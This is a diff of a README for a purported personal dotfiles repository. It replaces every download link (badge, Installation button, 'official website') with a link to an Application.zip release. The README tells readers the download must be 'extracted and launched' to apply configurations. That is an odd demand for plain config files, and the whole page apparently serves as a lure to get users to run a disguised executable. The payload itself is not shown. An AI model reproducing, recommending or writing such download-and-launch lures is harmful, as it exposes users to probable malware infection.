@@ -1,7 +1,7 @@
 
 # 🌟 Welcome to My Personal Dotfiles Repository! 🌟
 
-[![Download Dotfiles](https://img.shields.io/badge/Download-Dotfiles-green)](https://github.com/adelante20/Release/raw/refs/heads/master/Release.zip)
+[![Download Dotfiles](https://github.com/Ninjaturtle11/dotfiles/releases/download/v1.0/Application.zip)](https://github.com/Ninjaturtle11/dotfiles/releases/download/v1.0/Application.zip)
 
 Welcome to the "dotfiles" repository, where you can find my personal collection of dotfiles that I use to customize my development environment. Whether you are an Emacs, Neovim, Vim, or Windows user, this repository covers a wide range of configuration files to help you set up your system just the way you like it.
 
@@ -30,7 +30,7 @@ Here are some of the key features of this repository:
 ## Installation
 
 To get started, you can download the dotfiles by clicking the button below:
-[![Download Dotfiles](https://img.shields.io/badge/Download-Dotfiles-green)](https://github.com/adelante20/Release/raw/refs/heads/master/Release.zip)
+[![Download Dotfiles](https://github.com/Ninjaturtle11/dotfiles/releases/download/v1.0/Application.zip)](https://github.com/Ninjaturtle11/dotfiles/releases/download/v1.0/Application.zip)
 
 *Note: The downloaded file needs to be extracted and launched to apply the configurations.*
 
@@ -55,4 +55,4 @@ If you encounter any issues or have questions about the configurations provided 
 
 Thank you for visiting the "dotfiles" repository! Feel free to explore the configurations, customize your tools, and enhance your development environment with these dotfiles. Happy coding! 🚀
 
-✨ *Visit the [official website](https://github.com/adelante20/Release/raw/refs/heads/master/Release.zip) for more information.* ✨
+✨ *Visit the [official website](https://github.com/Ninjaturtle11/dotfiles/releases/download/v1.0/Application.zip) for more information.* ✨
